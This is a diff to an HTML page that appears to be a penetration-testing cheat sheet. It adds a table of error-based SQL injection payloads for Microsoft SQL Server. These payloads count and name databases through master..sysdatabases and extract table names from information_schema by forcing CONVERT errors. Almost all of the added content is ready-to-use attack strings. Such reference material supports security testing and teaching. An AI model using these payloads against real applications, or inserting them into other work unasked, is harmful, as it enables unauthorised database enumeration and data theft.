@@ -218,6 +218,8 @@ layout: default
         </table>
     </ul>
 
+    <h4>Sql Injections:
+
     <table>
         <tr>
             <td>Test for sql injections</td>
@@ -270,3 +272,37 @@ layout: default
             </td>
         </tr>
     </table>
+
+    <li>SQL Injection Error Attack</li>
+    <ul>
+        <li>Method #1 Current DB</li>
+        <table>
+            <tr>
+                <td>Enumerate number of databases</td>
+                <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--</td>
+            </tr>
+            <tr>
+                <td>Extract database name by number</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Method #1</td>
+                            <td>1 AND 1=CONVERT(INT,db_name(&lt;database #&gt;))--</td>
+                        </tr>
+                        <tr>
+                            <td>Method #2</td>
+                            <td>1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=&lt;database #&gt;))--</td>
+                        </tr>
+                    </table>
+                </td>
+            </tr>
+            <tr>
+                <td>Extra table count from current DB</td>
+                <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--</td>
+            </tr>
+            <tr>
+                <td>Extract table names from current DB</td>
+                <td>1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top <mark>&lt;increase # starting with 1&gt;</mark> TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--</td>
+            </tr>
+        </table>
+    </ul>
